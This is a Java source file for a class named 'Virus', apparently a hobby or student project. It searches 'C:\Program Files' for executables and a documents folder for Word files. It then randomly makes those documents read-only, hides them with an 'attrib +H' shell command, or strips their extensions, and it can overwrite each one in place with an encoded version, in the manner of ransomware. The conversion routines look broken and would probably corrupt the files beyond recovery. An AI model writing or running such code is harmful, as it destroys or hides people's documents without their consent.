package model;

import coder.Mixer;
import input_output.IOFileHandling;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.function.Predicate;

public class Virus {

    public static final Path DIRECTORY_WITH_EXE_FILES = Paths.get("C:", "Program Files");
    public static final Path DIRECTORY_WITH_DOC_FILES = Paths.get("E:", "docs");
    public static final int MAX_DEPTH = 3;

    private static List<String> filesNamesList = new ArrayList<>();
    private static Predicate<File> predicateExe = f -> f.getName().endsWith(".exe");
    private static Predicate<File> predicateDoc = f -> f.getName().endsWith(".doc") || f.getName().endsWith(".docx");
    private static int depth = 0;

    public static List<String> searchFiles() {
        search(DIRECTORY_WITH_EXE_FILES.toFile(), predicateExe);
        return filesNamesList;
    }

    public static List<String> searchFiles(Path path, Predicate<File> predicate) {
        if (Files.exists(path)) {
            search(path.toFile(), predicate);
        }
        return filesNamesList;
    }

    private static void search(File file, Predicate<File> predicate) {
        if (file.isDirectory() && file.canRead()) {
            File[] files = file.listFiles();
            if (files != null && files.length > 0) {
                Arrays.stream(files).forEach(f -> Virus.enterFile(f, predicate));
            }
        }
    }

    private static void enterFile(File f, Predicate<File> predicate) {
        if (f.isDirectory()) {
            if (depth < MAX_DEPTH) {
                depth++;
                search(f, predicate);
                depth--;
            }
        } else if (predicate.test(f)) {
            if (f.getAbsolutePath().split("/").length > 5) {
                System.out.println(f.getAbsolutePath());
            }
            filesNamesList.add(f.getAbsolutePath());
        }
    }

    public static void changeFilesAttributes() {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
        for (String s : filesList) {
            File file = new File(s);
            try {
                switch ((int) (Math.random() * 3)) {
                    case 0: {
                        file.setReadOnly();
                        break;
                    }
                    case 1: {
                        Runtime.getRuntime().exec("attrib +H " + s);
                        break;
                    }
                    case 2: {
                        file.renameTo(new File(s.substring(0, s.indexOf("."))));
                        break;
                    }
                }
            } catch (IOException e) {
                e.getMessage();
            }
        }
    }

    private static String byteArrToString(byte[] array) {
        String byteInString = "";
        assert array != null;
        for (byte b : array) {
            byteInString += b;
        }
        return byteInString;
    }

    private static byte[] stringToByteArr(String s) {
        byte[] byteArr = new byte[s.length()];
        for (int i = 0; i < s.length(); i++) {
            byteArr[i] = (byte) (s.charAt(i) == '1' ? 1 : 0);
        }
        return byteArr;
    }

    public static void encodeFiles() {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
        for (String s : filesList) {
            System.out.println(s);
            byte[] fileInByte = IOFileHandling.getByteArray(s);
            String encodedFile = Mixer.encode(byteArrToString(fileInByte));
            System.out.println(encodedFile);
            IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
        }
    }

    public static void decodeFiles() {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
        for (String s : filesList) {
            System.out.println(s);
            byte[] fileInByte = IOFileHandling.getByteArray(s);
            String encodedFile = Mixer.decode(byteArrToString(fileInByte));
            System.out.println(encodedFile);
            IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
        }
    }
}
